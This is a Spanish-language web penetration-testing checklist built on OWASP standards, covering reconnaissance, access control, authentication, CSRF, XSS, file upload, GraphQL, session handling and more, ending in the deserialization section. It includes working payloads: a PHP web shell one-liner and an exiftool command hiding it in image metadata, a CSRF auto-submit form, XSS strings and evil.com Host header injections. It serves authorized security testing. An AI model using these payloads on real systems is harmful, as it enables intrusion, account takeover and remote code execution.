# Checklist Web — Pentesting de Aplicaciones Web

> **Estándares:** OWASP WSTG · OWASP Top 10 2021 · OWASP API Security Top 10 2023
> **Nota:** Siempre que sea posible, utilizar al menos 2 cuentas durante las pruebas. Una con privilegios bajos y otra con privilegios de administración, para validar la escalada vertical. Para la escalada horizontal, usar 2 cuentas con el mismo rol.

## 📋 Índice

- [📌 Etapa inicial — Recolección de información](#etapa-inicial-recolección-de-información)
- [📌 Access Control](#access-control)
- [📌 API Testing](#api-testing)
- [📌 Autenticación](#autenticación)
- [📌 Clickjacking](#clickjacking)
- [📌 Cabeceras de Seguridad](#cabeceras-de-seguridad)
- [📌 CSRF](#csrf)
- [📌 XSS](#xss)
- [📌 File Upload](#file-upload)
- [📌 GraphQL](#graphql)
- [📌 Gestión de Sesiones](#gestión-de-sesiones)
- [📌 Host Header Attacks](#host-header-attacks)
- [📌 HTTP Request Smuggling](#http-request-smuggling)
- [📌 Deserialización Insegura](#deserialización-insegura)
- [📌 NoSQL Injection](#nosql-injection)
- [📌 Command Injection](#command-injection)
- [📌 Path Traversal](#path-traversal)
- [📌 Prototype Pollution](#prototype-pollution)
- [📌 SSRF](#ssrf)
- [📌 SSTI](#ssti)
- [📌 SQL Injection](#sql-injection)
- [📌 Transmisión Segura](#transmisión-segura)
- [📌 XXE](#xxe)
- [📌 Web Cache Poisoning](#web-cache-poisoning)


## 📌 Etapa inicial — Recolección de información

### 1. Reconocimiento pasivo (OSINT)

Buscar información pública sobre el target sin interactuar directamente con la aplicación:

- [ ] **Google Dorks** — buscar contenido sensible indexado:
  ```
  site:target.com filetype:pdf
  site:target.com inurl:admin
  site:target.com inurl:login
  site:target.com ext:sql OR ext:bak OR ext:env
  site:target.com "index of"
  ```
- [ ] **Wayback Machine** — recuperar versiones antiguas de la aplicación y endpoints históricos: https://web.archive.org
- [ ] **Shodan** — buscar información sobre el servidor: puertos abiertos, tecnologías, certificados: https://www.shodan.io
- [ ] **crt.sh** — consultar certificados SSL emitidos para el dominio: https://crt.sh/?q=target.com
- [ ] Usar `gau` o `waybackurls` para recuperar URLs históricas con parámetros que puedan ser interesantes:
  ```bash
  gau target.com | grep "?"
  waybackurls target.com | grep "?"
  ```

### 2. Detección de WAF

- [ ] Verificar si la aplicación está protegida por un WAF usando **WAFW00F**:
  ```bash
  wafw00f https://target.com
  ```
- [ ] Si hay WAF, solicitar al cliente que lo desactive siempre que sea posible.

### 3. Fingerprinting de tecnologías

- [ ] Identificar el stack tecnológico completo de la aplicación:
  - **Wappalyzer** — extensión de navegador para identificación automática de tecnologías
  - **whatweb** — fingerprinting desde línea de comandos:
    ```bash
    whatweb -a 3 https://target.com
    ```
  - Revisar extensiones de ficheros en las URLs: `.php`, `.asp`, `.aspx`, `.jsp`, `.do`, `.cfm`
  - Revisar cabeceras de respuesta informativas: `Server`, `X-Powered-By`, `X-AspNet-Version`, `X-Generator`, `X-AspNetMvc-Version`
- [ ] Documentar todas las tecnologías identificadas — cada tecnología puede tener vulnerabilidades conocidas específicas.

### 4. Exploración manual del sitio web

- [ ] Activar Burp Suite e interceptar todo el tráfico navegando manualmente por el sitio — ir a `Target → Site map` y verificar todos los endpoints descubiertos.
- [ ] Prestar atención a los problemas detectados automáticamente por Burp en la pestaña `Issues`.
- [ ] Verificar diferencias de contenido basadas en el User-Agent:
  - Acceder como crawler de motor de búsqueda: `Googlebot`
  - Acceder como agente móvil para detectar versiones móviles de la aplicación

### 5. Spider / Crawl en busca de contenido oculto

- [ ] Ejecutar spider/crawl para descubrir endpoints y recursos no enlazados directamente:
  ```bash
  gobuster dir -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,js,txt
  ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403
  ```
- [ ] Usar wordlists específicas según las tecnologías identificadas:
  - **SecLists** — https://github.com/danielmiessler/SecLists
  - **OneListForAll** — https://github.com/six2dez/OneListForAll
  - **assetnote** — https://wordlists.assetnote.io

### 6. Verificación de ficheros expuestos

- [ ] Verificar la existencia de ficheros que puedan exponer contenido sensible:
  ```
  /robots.txt          /sitemap.xml         /.DS_Store
  /.git/config         /.env                /web.config
  /WEB-INF/web.xml     /crossdomain.xml     /security.txt
  /.well-known/security.txt
  ```

### 7. Identificación de puntos de entrada

- [ ] Identificar dónde se usan métodos GET y dónde métodos POST.
- [ ] Identificar todos los parámetros utilizados en peticiones POST — prestar atención a los parámetros ocultos (`<input type="hidden">`).
- [ ] Identificar todos los parámetros en peticiones GET — muchos pueden estar en query string separados por `&`, `~`, `:` u otros caracteres especiales o codificados.
- [ ] Prestar atención a cabeceras adicionales o personalizadas no habituales (ej. `Debug: false`, `X-Internal: true`).

### 8. Identificación de parámetros interesantes en la respuesta

- [ ] Identificar dónde se establecen, modifican o añaden nuevas cookies (`Set-Cookie`).
- [ ] Identificar redirecciones (301, 302), errores de cliente (400, 403, 404) y errores internos del servidor (500, 503).
- [ ] Observar cabeceras de respuesta informativas — por ejemplo, `Server: BIG-IP` indica balanceo de carga.
- [ ] Documentar cabeceras que revelen tecnología: `X-Powered-By`, `X-AspNet-Version`, `X-Generator`, `Server`.

### 9. Identificación de roles de usuario

- [ ] Identificar todos los roles de usuario existentes en la aplicación.
- [ ] Intentar cambiar, alterar o acceder a funcionalidades de otro rol.
- [ ] Revisar la granularidad de los roles y los permisos otorgados.
- [ ] Usar la extensión **Autorize** de Burp Suite para automatizar la verificación de control de acceso entre roles.

### 10. Análisis de código JavaScript del lado del cliente

- [ ] Ir a `Target → Site map` en Burp y localizar todos los ficheros JavaScript de la aplicación.
- [ ] Usar **LinkFinder** para extraer endpoints y rutas de API embebidos en los ficheros JS:
  ```bash
  python3 linkfinder.py -i https://target.com -d -o cli
  ```
- [ ] Usar **SecretFinder** para buscar secrets, API keys y credenciales hardcodeadas en JS:
  ```bash
  python3 secretfinder.py -i https://target.com/app.js -o cli
  ```
- [ ] Usar **Retire.js** para identificar librerías JavaScript con vulnerabilidades conocidas:
  ```bash
  retire --js --path /ruta/al/js
  ```
- [ ] Verificar si existen source maps (`.js.map`) expuestos — revelan el código fuente original.



## 📌 Access Control

### 1. Acceso sin autenticación y tras cierre de sesión

- [ ] Verificar si es posible acceder al recurso incluso si el usuario no está autenticado.
- [ ] Verificar si es posible acceder al recurso después del cierre de sesión (tokens o sesiones no invalidadas en servidor).

> 💡 **Tip:** Copia la URL o el token de sesión antes de cerrar sesión y comprueba si siguen siendo válidos tras el logout.

### 2. Acceso a recursos de otros roles y privilegios

- [ ] Verificar si es posible acceder a funciones y recursos que deberían ser accesibles únicamente para un usuario con un rol o privilegio diferente.
- [ ] Verificar si es posible acceder a otras cuentas de usuario modificando parámetros en la URL (ej. `?user_id=1337`).

### 3. Bypass Horizontal

> Acceso a recursos de otro usuario con el mismo nivel de privilegio.

- [ ] Verificar si es posible acceder a recursos que deberían ser accesibles únicamente para un usuario con una identidad diferente pero con el mismo rol o privilegio.
- [ ] Verificar si es posible operar funciones sobre recursos que pertenecen a otro usuario con la misma identidad de rol.

### 4. Bypass Vertical

> Acceso a recursos o funciones reservadas a roles superiores.

- [ ] Verificar si es posible acceder a recursos que deberían ser accesibles solo para un usuario con un rol superior.
- [ ] Verificar si es posible acceder a funciones administrativas estando autenticado como usuario no administrativo.
- [ ] Verificar si es posible operar funciones sobre recursos que deberían ser operativos únicamente por un usuario con una identidad de rol superior o específica.

### 5. Manipulación de respuesta y exposición de datos sensibles

- [ ] Verificar si es posible alterar el ROL de un usuario mediante la inclusión de parámetros manipulados en la respuesta del servidor.
- [ ] Verificar si se expone la contraseña u otros datos sensibles en el perfil de usuario o en las respuestas.

### 6. Prueba de Referencia de Objeto Directo Inseguro (IDOR)

- [ ] Identificar todos los puntos de la aplicación donde puedan ocurrir referencias a objetos: IDs numéricos, hashes, nombres de archivo, etc.
- [ ] Evaluar las medidas de control de acceso implementadas y determinar si son vulnerables a IDOR.
- [ ] Verificar referencias a objetos no numéricos: GUIDs o hashes que parecen opacos pero pueden ser predecibles o filtrarse en otras respuestas de la aplicación.

> 💡 **Herramienta recomendada:** Plugin [Autorize](https://github.com/PortSwigger/autorize) para Burp Suite.

### 7. Intercambio y manipulación de métodos HTTP

- [ ] Intercambiar métodos GET/POST (y otros: PUT, DELETE, PATCH, HEAD, OPTIONS) en busca de peticiones que el servidor procese con un método distinto al esperado.
- [ ] Probar la cabecera `X-HTTP-Method-Override: DELETE` para forzar métodos restringidos.

### 8. Manipulación de cabeceras de control de acceso

- [ ] Probar la cabecera `X-Original-URL` para reescribir la ruta solicitada y acceder a recursos restringidos.
- [ ] Probar la cabecera `X-Rewrite-URL` con el mismo objetivo en servidores que la soporten.
- [ ] Probar la cabecera `X-Forwarded-For` cuando el backend toma decisiones de acceso basándose en la IP origen.

### 9. Forced Browsing (navegación forzada)

- [ ] Intentar acceder directamente a URLs conocidas o inferidas sin tener enlace explícito a ellas.
  - Ejemplos: `/admin/users`, `/dashboard/reports`, `/api/v1/admin/config`, `/internal/debug`
- [ ] Usar wordlists específicas de rutas de administración ([SecLists — Discovery/Web-Content](https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content)).

### 10. HTTP Parameter Pollution (HPP)

- [ ] Duplicar parámetros en la petición para explotar inconsistencias en cómo el servidor los procesa.
  - Ejemplo: `?id=123&id=456` — algunos frameworks usan el primer valor y otros el último.
- [ ] Probar también en el body de peticiones POST y en cabeceras cuando sean procesadas por múltiples componentes.



## 📌 API Testing

### 1. Documentación expuesta públicamente

- [ ] Buscar documentación de la API en rutas conocidas:
  - `/swagger-ui` · `/swagger-ui.html` · `/openapi.json` · `/openapi.yaml`
  - `/api-docs` · `/v1/api-docs` · `/v2/api-docs` · `/redoc`
  - `/graphql` · `/graphiql` · `/altair` (GraphQL introspection)
  - `/wsdl` · `?wsdl` (servicios SOAP)
- [ ] Si se encuentra documentación, enumerarla completamente: endpoints, métodos HTTP, parámetros y esquemas de autenticación.
- [ ] Verificar si la documentación expone endpoints o funciones no accesibles desde la UI pero sí desde la API directamente.

> 💡 **Tip:** Usa [ffuf](https://github.com/ffuf/ffuf) o [feroxbuster](https://github.com/epi052/feroxbuster) con wordlists específicas de APIs para descubrir documentación no enlazada.

### 2. Endpoints antiguos y versionado inseguro

- [ ] Identificar la versión actual de la API e intentar acceder a versiones anteriores: `/api/v1/`, `/api/v2/`, `/api/v0/`.
- [ ] Comprobar si las versiones antiguas tienen los mismos controles de seguridad que la versión actual.
- [ ] Verificar si endpoints deprecados siguen activos y pueden utilizarse.

### 3. BOLA — Broken Object Level Authorization

> Equivalente al IDOR en APIs REST. Vulnerabilidad #1 según OWASP API Security Top 10 (API1:2023).

- [ ] Identificar todos los endpoints que reciben un identificador de objeto: IDs numéricos, UUIDs, slugs, hashes.
- [ ] Sustituir el identificador por el de otro usuario o recurso y verificar si el servidor devuelve datos no autorizados.
- [ ] Probar en todos los métodos HTTP: GET, POST, PUT, PATCH, DELETE.

### 4. Exceso de datos en respuesta

> La API devuelve más campos de los que la UI muestra al usuario final (API3:2023).

- [ ] Analizar las respuestas JSON/XML y compararlas con lo que muestra la UI — buscar campos ocultos como `password`, `token`, `role`, `isAdmin`, `ssn`, `creditCard`.
- [ ] Comprobar si campos sensibles se devuelven aunque no sean necesarios para la función del endpoint.

### 5. Mass Assignment

- [ ] Analizar las respuestas de la API para descubrir campos internos que el servidor maneja pero no expone en la UI.
- [ ] Intentar incluir campos sensibles en el body que el servidor no debería aceptar del cliente:
  - `"role": "admin"` · `"isAdmin": true` · `"isVerified": true` · `"credits": 9999`
- [ ] Probar en endpoints de registro de usuario, actualización de perfil y creación de recursos.



## 📌 Autenticación

### 1. Enumeración de usuarios

- [ ] Buscar páginas donde la aplicación verifique si un usuario existe: formulario de login, registro y restablecimiento de contraseña.
- [ ] Verificar si la aplicación devuelve mensajes de error diferentes para usuarios válidos e inválidos:
  - Login: *"Usuario incorrecto"* vs *"Contraseña incorrecta"* → vulnerable.
  - Reset: *"Email no encontrado"* vs *"Si el email existe recibirás un enlace"* → vulnerable.
- [ ] Verificar diferencias en el tiempo de respuesta entre usuarios válidos e inválidos (timing attack).
- [ ] Probar enumeración en el formulario de registro: ¿indica si el email/usuario ya está en uso?

> 💡 **Tip:** Usa Burp Intruder con una lista de usuarios y ordena por longitud o tiempo de respuesta para identificar usuarios válidos sin necesidad de un mensaje explícito.

### 2. Autenticación de dos factores (2FA / MFA)

- [ ] Verificar si el OTP es reutilizable tras haber sido usado una vez.
- [ ] Verificar si el OTP tiene una expiración adecuada — probar OTPs caducados.
- [ ] Probar si es posible saltar el paso de 2FA accediendo directamente a la URL post-login.
- [ ] Verificar si existe protección contra fuerza bruta sobre el código OTP (6 dígitos = 1.000.000 combinaciones).

> 💡 **Tip:** Para testear el bypass de 2FA, completa el primer factor, copia la URL que solicita el OTP y navega directamente al dashboard sin introducir el código.

### 3. Restablecimiento y recuperación de contraseña

- [ ] Evaluar si el proceso de restablecimiento es más débil que el propio proceso de autenticación.
- [ ] Probar la protección contra ataques de fuerza bruta en el formulario de reset.
- [ ] Probar **Host Header Injection** en el email de reset:
  ```http
  POST /forgot-password HTTP/1.1
  Host: evil.com
  
  email=victim@target.com
  ```
- [ ] Verificar si el token de reset sigue siendo válido después de cambiar la contraseña.
- [ ] Si se envía un enlace por email o SMS:
  - [ ] Verificar si utiliza HTTPS.
  - [ ] Verificar si el enlace puede ser utilizado múltiples veces.
  - [ ] Verificar si expira si permanece sin uso.
  - [ ] Evaluar si el token es suficientemente largo y aleatorio (mínimo 128 bits de entropía).
  - [ ] Verificar si el enlace contiene un ID de usuario en texto claro o codificado en Base64.
  - [ ] Verificar si el token se filtra a terceros a través de cabeceras `Referer` o integraciones de analytics/CDN.

### 4. Proceso de cambio de contraseña

- [ ] Verificar si al usuario se le exige volver a autenticarse (introducir la contraseña actual) cuando está conectado e intenta cambiarla.
- [ ] Verificar si la sesión se cierra correctamente en todos los dispositivos activos tras el cambio de contraseña.

### 5. Fuerza bruta en el formulario de login

- [ ] Verificar si el formulario de login tiene protección contra fuerza bruta: lockout de cuenta, CAPTCHA, throttling.
- [ ] Comprobar si el lockout es por usuario o por IP.
- [ ] Probar si el bloqueo por IP puede evadirse mediante cabeceras:
  - `X-Forwarded-For: 1.2.3.4`
  - `X-Real-IP: 1.2.3.4`
  - `CF-Connecting-IP: 1.2.3.4`

### 6. Cierre de sesión

- [ ] Verificar la presencia de la funcionalidad de cierre de sesión en la aplicación.
- [ ] Verificar que la sesión se invalida correctamente en el servidor tras el logout — no solo se elimina la cookie en el cliente.
- [ ] Verificar que tras el cierre de sesión no es posible reutilizar el token o cookie de sesión anterior.
- [ ] Verificar que la sesión se cierra correctamente tras el cambio de contraseña.

> 💡 **Tip:** Tras hacer logout, copia el valor de la cookie de sesión y realiza una petición autenticada con ella. Si el servidor responde con éxito, la sesión no se está invalidando correctamente.

### 7. Credenciales por defecto

- [ ] Probar credenciales por defecto en paneles de administración, CMS y frameworks identificados:
  - `admin / admin` · `admin / password` · `admin / 1234` · `root / root`
- [ ] Consultar bases de datos de credenciales por defecto:
  - [DefaultCreds-cheat-sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet)
  - [CIRT.net Default Passwords](https://www.cirt.net/passwords)

### 8. Transmisión de credenciales y atributos de seguridad

- [ ] Verificar que el formulario de login transmite las credenciales siempre por HTTPS.
- [ ] Verificar que la contraseña no se transmite ni almacena en logs, URLs o cabeceras.



## 📌 Clickjacking

### 1. Verificar si la aplicación es vulnerable a Clickjacking

- [ ] Usar la PoC de Clickjacking (`clickjacking_poc.html`) para intentar cargar la página objetivo en un iframe e identificar si es embebible.
- [ ] Priorizar páginas de alto valor: cambio de contraseña o email, borrado de cuenta, acciones administrativas, otorgar permisos.
- [ ] Si la página carga en el iframe, construir un PoC funcional que demuestre el impacto con una acción concreta.

> 💡 **Recurso:** `clickjacking_poc.html` — Introduce la URL objetivo, pulsa "Mostrar iframe" y verifica si la página se carga dentro del iframe superpuesto al contenido señuelo.



## 📌 Cabeceras de Seguridad

### 1. Análisis general de cabeceras

- [ ] Ejecutar [shcheck](https://github.com/santoru/shcheck) o [SecurityHeaders.com](https://securityheaders.com) para obtener una visión general del estado de las cabeceras de seguridad.

### 2. Content Security Policy (CSP)

- [ ] Verificar si la cabecera `Content-Security-Policy` está presente y correctamente configurada.
- [ ] Evaluar la configuración de CSP:
  - [CSP Evaluator (Google)](https://csp-evaluator.withgoogle.com/) — detecta directivas débiles o inseguras.
- [ ] Identificar posibles bypasses de CSP:
  - [HackTricks — CSP Bypass](https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass)
  - [JSONBee — JSONP endpoints para bypass de CSP](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt)
- [ ] Una CSP bien implementada hace innecesarios `X-Frame-Options` y `X-XSS-Protection` — verificar igualmente su presencia como capa adicional.

### 3. HTTP Strict Transport Security (HSTS)

- [ ] Verificar si el encabezado `Strict-Transport-Security` está presente.
- [ ] Verificar que incluye `max-age` con un valor suficientemente alto (mínimo: 31536000 segundos = 1 año).
- [ ] Verificar que incluye la directiva `includeSubDomains`.

### 4. X-Frame-Options

- [ ] Verificar si el encabezado `X-Frame-Options` está presente.

> 💡 **Nota:** Si la CSP incluye `frame-ancestors`, este encabezado es redundante — aunque su presencia como fallback sigue siendo recomendable.

### 5. X-Content-Type-Options

- [ ] Verificar si el encabezado `X-Content-Type-Options: nosniff` está presente.

### 6. Eliminación de cabeceras informativas

- [ ] Verificar si el encabezado `Server` expone información sobre el servidor web y su versión.
- [ ] Verificar si el encabezado `X-Powered-By` expone el lenguaje o framework utilizado.
- [ ] Verificar si existen otras cabeceras informativas: `X-AspNet-Version`, `X-AspNetMvc-Version`, `X-Generator`.

### 7. CORS (Cross-Origin Resource Sharing)

- [ ] Verificar si `Access-Control-Allow-Origin` refleja el valor del header `Origin` sin validación.
- [ ] Verificar si `Access-Control-Allow-Origin: *` se combina con `Access-Control-Allow-Credentials: true`.
- [ ] Verificar si se acepta el origen `null` en la respuesta.

### 8. Referrer-Policy

- [ ] Verificar si el encabezado `Referrer-Policy` está presente.

### 9. Permissions-Policy

- [ ] Verificar si el encabezado `Permissions-Policy` está presente.

### 10. Cache-Control en respuestas con datos sensibles

- [ ] Verificar que las páginas autenticadas incluyen cabeceras de caché restrictivas (`Cache-Control: no-store`).



## 📌 CSRF

### 1. Sin defensa

- [ ] Identificar acciones sensibles que deberían estar protegidas: cambio de email/contraseña, cambio de datos de perfil, acciones administrativas.
- [ ] Verificar si la petición no incluye ningún mecanismo de protección CSRF (token, cabecera custom, SameSite).
- [ ] Construir un PoC funcional que demuestre el impacto:
  ```html
  <html>
    <body>
      <form action="https://target.com/change-email" method="POST">
        <input type="hidden" name="email" value="attacker@evil.com">
      </form>
      <script>document.forms[0].submit();</script>
    </body>
  </html>
  ```

### 2. Token CSRF presente — casos de bypass

- [ ] Verificar si el token es validado correctamente probando los siguientes casos:
  - **Token vacío** — enviar el parámetro con valor vacío: `csrf_token=`
  - **Token eliminado** — eliminar el parámetro por completo de la petición
  - **Token de otra sesión** — usar un token CSRF válido pero perteneciente a otra cuenta
  - **Token predecible** — analizar la entropía del token con Burp Sequencer

> 💡 **Tip:** Usa Burp Sequencer para analizar la entropía de los tokens CSRF capturados. Un token con baja entropía puede ser predecible.

### 3. Token no vinculado a sesión

- [ ] Verificar si el token CSRF está vinculado a la sesión del usuario o si es un valor global válido para cualquier sesión.
- [ ] Capturar el token CSRF de una cuenta controlada por el atacante e incluirlo en un PoC contra la cuenta víctima.

### 4. Bypass con Method Override

- [ ] Verificar si la acción puede ejecutarse cambiando el método de POST a GET.
- [ ] Probar el parámetro `_method` para forzar un método diferente al de la petición.

### 5. Bypass con validación de Referer

- [ ] Verificar si la aplicación valida el header `Referer` como mecanismo de protección CSRF.
- [ ] Probar los siguientes bypasses:
  - **Referer ausente** — eliminar el header `Referer` de la petición.
  - **Dominio legítimo como subdirectorio** — `https://evil.com/https://target.com`
  - **Dominio legítimo como subdominio** — `https://target.com.evil.com`
  - **Dominio legítimo como parámetro** — `https://evil.com/?target.com`



## 📌 XSS

> **Nota:** La detección de XSS reflejado en parámetros GET/POST está cubierta por **Acunetix**. Esta sección se centra en los casos que requieren verificación manual.

### 1. XSS Almacenado (Stored XSS)

- [ ] Identificar campos de entrada cuyos valores se almacenan y se renderizan para otros usuarios: comentarios, nombres de perfil, descripciones, tickets, mensajes internos.
- [ ] Prestar especial atención a campos que se renderizan en paneles de administración.
- [ ] Inyectar payloads y verificar si se ejecutan al visualizar el contenido desde otra cuenta o desde el panel de administración.
  ```html
  <script>alert(document.domain)</script>
  "><img src=x onerror=alert(document.domain)>
  '"><svg onload=alert(document.domain)>
  ```

### 2. XSS en DOM (DOM-based XSS)

- [ ] Revisar el código JavaScript en busca de fuentes controlables asignadas a sinks peligrosos sin sanitización:
  - **Fuentes:** `document.location`, `location.hash`, `location.search`, `document.referrer`, `window.name`
  - **Sinks:** `innerHTML`, `outerHTML`, `document.write()`, `eval()`, `location.href`

### 3. XSS en cabeceras HTTP

- [ ] Verificar si las cabeceras `User-Agent`, `Referer` o `X-Forwarded-For` se reflejan en la respuesta HTML o en paneles de administración sin sanitización.

### 4. Bypass de filtros y WAF

- [ ] Si hay WAF o filtros de entrada, verificar si es posible bypassearlos con variaciones de los payloads estándar.

> 💡 **Recursos:** [XSStrike](https://github.com/s0md3v/XSStrike) y [dalfox](https://github.com/hahwul/dalfox) automatizan la búsqueda de bypasses.

### 5. XSS en contextos especiales

- [ ] Verificar XSS en valores de atributos HTML: `" onmouseover="alert(1)`
- [ ] Verificar XSS dentro de bloques `<script>`: `"-alert(1)-"`
- [ ] Verificar XSS en SVG: `<svg onload=alert(1)>`
- [ ] Verificar XSS en contexto de `href`: `javascript:alert(document.domain)`



## 📌 File Upload

### 1. Shell upload sin protección

- [ ] Verificar si es posible subir directamente un fichero con extensión ejecutable sin validación: `.php`, `.php3`, `.php5`, `.phtml`, `.asp`, `.aspx`, `.jsp`
- [ ] Tras la subida, verificar que el servidor ejecuta el código — no solo que acepta el fichero.
  ```php
  <?php system($_GET["cmd"]); ?>
  ```

### 2. Shell upload modificando Content-Type

- [ ] Subir un fichero ejecutable modificando el `Content-Type` a un valor de imagen: `image/jpeg`, `image/png`, `image/gif`

### 3. Shell upload vía Path Traversal

- [ ] Manipular el parámetro `filename` en la petición multipart para escribir fuera del directorio de uploads:
  ```
  Content-Disposition: form-data; name="file"; filename="../shell.php"
  ```

> 💡 **Tip:** Si la aplicación normaliza `../`, probar: `....//`, `..%2F`, `%2e%2e%2f`

### 4. Shell upload por bypass de extensión (lista negra)

- [ ] Probar variaciones: `shell.php3`, `shell.php4`, `shell.php5`, `shell.phtml`, `shell.pHp`, `shell.PHP`, `shell.shtml`
- [ ] Probar extensiones alternativas por servidor:
  - **Apache:** `.phtml`, `.phar`, `.php5`, `.shtml`
  - **IIS:** `.asp`, `.cer`, `.asa`, `.aspx`, `.ashx`

### 5. Shell upload vía doble extensión

- [ ] Probar combinaciones: `shell.jpg.php`, `shell.php.jpg`, `shell.php.xxxxx`

> 💡 **Tip:** En Apache con `mod_mime`, `shell.php.jpg` puede ser interpretado como PHP.

### 6. Shell upload con Null Byte

- [ ] Probar: `shell.php%00.jpg`, `shell.php\x00.jpg`

> 💡 **Nota:** Efectivo principalmente en aplicaciones PHP antiguas (< PHP 5.3.4).

### 7. Shell upload con fichero Polígota (Polyglot)

- [ ] Insertar el payload PHP en los metadatos EXIF de una imagen real:
  ```bash
  exiftool -Comment="<?php system($_GET['cmd']); ?>" imagen.jpg
  mv imagen.jpg shell.php.jpg
  ```

### 8. Verificación de almacenamiento y ejecución

- [ ] Verificar que el fichero se almacena dentro del webroot y es accesible via HTTP.
- [ ] Verificar que el servidor ejecuta el código del fichero subido y no lo sirve como texto plano.

### 9. SVG como vector XSS

- [ ] Si la aplicación permite subir SVG, verificar si el contenido es renderizado sin sanitización:
  ```xml
  <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
    <rect width="100" height="100"/>
  </svg>
  ```

### 10. XXE via SVG / XML upload

- [ ] Si la aplicación procesa SVG, XML o documentos Office en el servidor, verificar si es posible inyectar entidades externas XML (XXE).



## 📌 GraphQL

### 1. Detección del endpoint GraphQL

- [ ] Buscar el endpoint en rutas conocidas: `/graphql` · `/graphiql` · `/altair` · `/playground` · `/api/graphql` · `/v1/graphql`
- [ ] Verificar si la interfaz interactiva (GraphiQL, Apollo Playground) está expuesta en producción.

### 2. Autenticación en el endpoint

- [ ] Verificar si el endpoint requiere autenticación o es accesible sin token.

### 3. Introspection query

- [ ] Verificar si la introspección está habilitada — en producción debería estar desactivada.
  ```json
  { "query": "{ __schema { types { name fields { name type { name } } } } }" }
  ```

> 💡 **Herramienta:** [GraphQL Voyager](https://github.com/graphql-kit/graphql-voyager) · [InQL](https://github.com/doyensec/inql) (plugin Burp)

### 4. Análisis de queries y mutaciones

- [ ] Identificar todas las queries y mutaciones del esquema extraído.
- [ ] Verificar si las mutaciones realizan acciones sensibles sin controles de autorización adecuados.
- [ ] Probar las queries con identificadores de otros usuarios (BOLA).

### 5. Batching de queries y bypass de rate limiting

- [ ] Verificar si el endpoint acepta múltiples queries en un único request (batching):
  ```json
  [
    {"query": "{ user(id: 1) { email } }"},
    {"query": "{ user(id: 2) { email } }"}
  ]
  ```
- [ ] Probar bypass de rate limiting mediante aliases.



## 📌 Gestión de Sesiones

### 1. Identificación del mecanismo de sesión

- [ ] Establecer cómo se maneja la gestión de sesiones: token en cookie, Local Storage, URL o JWT.
- [ ] Detectar todas las cookies utilizadas e identificar cuál es la cookie de sesión principal.
- [ ] Verificar si los tokens se almacenan en Local Storage — vulnerable a robo via XSS.

### 2. Análisis de la estructura del token de sesión

- [ ] Analizar la aleatoriedad, unicidad y longitud del token.
- [ ] Usar Burp Sequencer para analizar la entropía estadística de los tokens capturados.
- [ ] Verificar si el token filtra información sensible: usuario, rol, timestamp codificados en Base64 o hex.

> 💡 **Tip:** Un token con menos de 64 bits de entropía efectiva es insuficiente.

### 3. Flags de la cookie de sesión

- [ ] Verificar que la cookie tiene el flag `HttpOnly`.
- [ ] Verificar que la cookie tiene el flag `Secure`.
- [ ] Verificar que la cookie tiene `SameSite` correctamente configurado: `Strict`, `Lax` o `None`.

### 4. Alcance y duración de la cookie de sesión

- [ ] Verificar el atributo `Path`.
- [ ] Verificar el atributo `Domain`.
- [ ] Verificar los atributos `Expires` y `Max-Age`.

### 5. Expiración y terminación de sesión

- [ ] Verificar la terminación de la sesión después del tiempo de inactividad (timeout).
- [ ] Probar si el timeout es aplicado por el cliente o por el servidor.

### 6. Rotación de tokens de sesión

- [ ] Confirmar que se emite un nuevo token al iniciar sesión.
- [ ] Confirmar que se emite un nuevo token al cambiar de rol o escalar privilegios.
- [ ] Verificar la fijación de sesión — si la aplicación acepta un token establecido antes del login y lo mantiene después.

### 7. Sesiones simultáneas

- [ ] Probar si los usuarios pueden tener múltiples sesiones simultáneas activas.
- [ ] Comprobar si al cambiar la contraseña se invalidan todas las sesiones activas.

### 8. JWT como token de sesión

- [ ] Probar el **algoritmo `none`** — cambiar el header del JWT a `{"alg":"none"}` y eliminar la firma.
- [ ] Probar **confusión de algoritmo RS256 → HS256**.
- [ ] Verificar que el JWT tiene una expiración (`exp`) adecuada y que el servidor la valida.
- [ ] Verificar si el JWT contiene información sensible en el payload.

> 💡 **Herramienta:** [jwt_tool](https://github.com/ticarpi/jwt_tool) · JWT Editor (plugin Burp)



## 📌 Host Header Attacks

### 1. Cabeceras alternativas de override de Host

- [ ] Probar en todos los ataques sustituyendo o combinando con las cabeceras alternativas:
  ```http
  X-Forwarded-Host: evil.com
  X-Host: evil.com
  X-Forwarded-Server: evil.com
  X-HTTP-Host-Override: evil.com
  Forwarded: host=evil.com
  ```

> 💡 **Tip:** Prueba primero con `Host` directamente y después repite el ataque con cada cabecera alternativa.

### 2. Password Reset Poisoning

- [ ] Verificar si la aplicación usa el valor de `Host` para construir el enlace de reset de contraseña.
- [ ] Modificar `Host` por un dominio controlado y solicitar un reset para una cuenta víctima.
- [ ] Repetir el ataque usando las cabeceras alternativas del bloque 1.

### 3. Bypass de autenticación por cabecera Host

- [ ] Verificar si la aplicación usa `Host` para tomar decisiones de autenticación o control de acceso.
- [ ] Probar con valores que simulen acceso interno: `localhost`, `127.0.0.1`, `internal.target.com`, `admin.target.com`
- [ ] Repetir el ataque usando las cabeceras alternativas del bloque 1.



## 📌 HTTP Request Smuggling

> ⚠️ **Precaución:** Puede afectar a peticiones de otros usuarios reales. Extremar la precaución en entornos productivos.

### 1. Detección automática

- [ ] Ejecutar `smuggler.py` contra el target:
  ```bash
  python3 smuggler.py -u https://target.com
  ```
- [ ] Usar el plugin **HTTP Request Smuggler** de Burp Suite para detección y explotación guiada.

### 2. Vectores principales

- [ ] **CL.TE** — el frontend usa `Content-Length` y el backend usa `Transfer-Encoding`.
- [ ] **TE.CL** — el frontend usa `Transfer-Encoding` y el backend usa `Content-Length`.
- [ ] **TE.TE** — ambos soportan `Transfer-Encoding` pero uno puede ser confundido con ofuscación.



## 📌 Deserialización Insegura

> 💡 **Nota:** La deserialización insegura no ocurre solo en cookies — verificar también en parámetros GET/POST, cabeceras HTTP, APIs y ficheros subidos.

### 1. Identificación de datos serializados

- [ ] Identificar el formato de serialización por su firma característica:

| Tecnología | Firma / Patrón |
|---|---|
| Java | `rO0AB` (Base64) · `\xac\xed\x00\x05` (raw) |
| PHP | `O:` · `a:` · `s:` al inicio del valor |
